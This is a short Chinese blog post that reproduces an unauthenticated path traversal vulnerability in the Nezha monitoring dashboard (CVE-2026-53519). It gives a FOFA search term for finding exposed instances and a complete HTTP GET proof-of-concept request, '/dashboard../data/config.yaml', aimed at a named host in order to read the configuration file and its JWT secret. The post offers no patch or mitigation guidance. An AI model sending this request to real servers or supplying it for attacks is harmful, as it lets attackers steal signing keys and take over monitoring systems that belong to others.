#  【复现】哪吒监控Nezha未授权路径穿越漏洞  
原创 泼猴
                    泼猴  表哥带我   2026-06-16 08:48  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/UA4ABKCY6OxyJpmzGAfgibIm3YQH9c3vcMKb1CCzHgAhdHmMwfHqyyzcDLAiaPfJkF7VdBTYtYribWibHfTC53JZa7trp5QYG6OF9wj5jKjrJZk/640?wx_fmt=gif&from=appmsg "")  
  
哪吒监控（Nezha）v2.0.13  
 以下版本存在严重未授权路径穿越漏洞，编号 CVE-2026-53519  
，CVSS 评分为 9.1  
 属高危级别。攻击者通过构造 GET 请求（如 /dashboard../data/config.yaml  
）即可读取配置文件，获取其中的 JWT 密钥  
。  
#### 哪吒监控（Nezha）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/UA4ABKCY6OwRJr1FdcoG9qp7kOUfu3nhF5YQwwIa7TRd4MDGghusTBh7QaBxTZ0hJoTmGcatQf4rOUcwnibp3Kiaz1S4NAibQghrtmoAZYNcJQ/640?wx_fmt=png&from=appmsg "")  
#### fofa搜索：nezha  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/UA4ABKCY6OzUR69WjABWgXYQ70bw6ksrGahRwpKPHzDCUGLw61oABXmdnMD9SWL2FqLFhia3OxxIqFCyJr1PmRBdFziaT7WAYfNGreUehQdOw/640?wx_fmt=png&from=appmsg "")  
#### POC：  
```
GET /dashboard../data/config.yaml HTTP/1.1Host: jk.h-acker.cnUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/UA4ABKCY6OwKtRlCCn5jNq3TLK9Gia44Qfsoq3fp4SSNwuiaTWIAyqwHKibVTlp489n0KW2ib3NqG39jIRa0KdksMgURw7tFbzdTKZ9BkiaYRCdk/640?wx_fmt=png&from=appmsg "")  
  
  
